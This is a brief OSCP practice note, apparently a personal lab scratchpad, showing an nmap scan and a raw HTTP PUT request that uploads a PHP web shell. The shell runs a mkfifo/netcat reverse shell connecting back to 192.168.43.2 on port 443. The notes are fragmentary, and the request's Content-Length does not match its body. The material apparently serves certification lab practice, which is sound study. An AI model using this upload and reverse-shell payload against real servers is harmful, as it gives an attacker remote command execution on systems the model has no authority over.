# OSCP_Practice

nmap -SV -p- 192.168.1.107<br/>

use burp to inves by<br/>

====================================
PUT /test/shell.php HTTP/1.1 <br/>
Host: 192.168.1.108<br/>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br/>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br/>
Accept-Language: en-US,en;q=0.5<br/>
Accept-Encoding: gzip, deflate<br/>
Connection: close<br/>
Upgrade-Insecure-Requests: 1<br/>
Content-Length: 11<br/>

<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.43.2 443 >/tmp/f"); ?><br/>
====================================
x
